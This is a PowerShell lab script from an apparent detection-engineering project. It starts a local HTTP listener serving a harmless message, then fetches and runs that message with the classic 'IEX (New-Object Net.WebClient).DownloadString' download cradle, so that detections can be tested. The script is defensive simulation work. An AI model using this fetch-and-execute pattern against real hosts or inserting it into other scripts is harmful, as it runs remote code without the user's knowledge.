# sim-02-download-cradle.ps1

# Project: Suspicious PowerShell Detection Engineering

# Simulation: Download cradle / fileless execution pattern

# Purpose: Generate harmless PowerShell activity containing IEX + DownloadString

# Lab use only

Write-Host "Starting PS-002 download cradle simulation..." -ForegroundColor Cyan

$payload = 'Write-Host "SIMULATION: Payload downloaded and executed" -ForegroundColor Green'

$listenerJob = Start-Job -ScriptBlock {
param($payload)

```
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://127.0.0.1:8888/")
$listener.Start()

$context = $listener.GetContext()
$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)

$context.Response.ContentType = "text/plain"
$context.Response.ContentLength64 = $bytes.Length
$context.Response.OutputStream.Write($bytes, 0, $bytes.Length)
$context.Response.OutputStream.Close()

$listener.Stop()
```

} -ArgumentList $payload

Start-Sleep -Seconds 2

powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8888/payload.ps1')"

Wait-Job $listenerJob -Timeout 10 | Out-Null
Receive-Job $listenerJob | Out-Null
Remove-Job $listenerJob -Force

Write-Host "PS-002 simulation completed." -ForegroundColor Green
